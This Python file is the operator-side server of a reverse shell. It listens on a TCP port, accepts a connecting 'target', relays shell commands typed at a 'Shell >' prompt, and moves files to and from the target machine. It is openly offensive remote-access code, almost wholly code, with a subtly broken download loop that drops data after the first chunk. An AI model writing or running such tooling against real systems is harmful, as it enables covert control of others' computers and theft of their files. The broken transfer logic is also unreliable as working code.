# SERVER CODE 

import socket
import json
import os

def reliable_recv():
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except Exception as err:
            print(f"[-] An error occurred -> {err}")
            continue

def reliable_send(command):
    jsondata = json.dumps(command)
    target.send(jsondata.encode())

def download_file(file_name):
    f = open(file_name, "wb") # Write bytes to file
    target.settimeout(1) # Add a timeout for 1 second
    chunk = target.recv(1024)
    
    while chunk:
        f.write(chunk)
        try:
            target.recv(1024)
        except socket.timeout:
            break
        
    target.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, "rb") # Read bytes
    target.send(f.read())
    f.close()
        
def target_communication(sock):
    sock.settimeout(1)
    while True:
        command = input("Shell > ")
        reliable_send(command)
        
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            print("[+] Directory changed")
            continue
        elif command == 'cls' or command == 'clear':
            os.system('cls')
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == "upload":
            upload_file(command[7:])
        else:
            try:    
                result = reliable_recv()
            except socket.timeout:
                print("[!] Timeout reached! \n")
                continue
            
            if result:
                print(result)
            else:
                print("[-] No data has been received from target")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Ipv4 & TCP
sock.bind(('127.0.0.1', 5555))

print("[+] Listening for the incoming connections . . .")
sock.listen(5)
target, ip = sock.accept() # Store target socket and target IP
print(f"[+] Target connected from : {ip}")

# Now communicate with target
target_communication(sock)

sock.close()
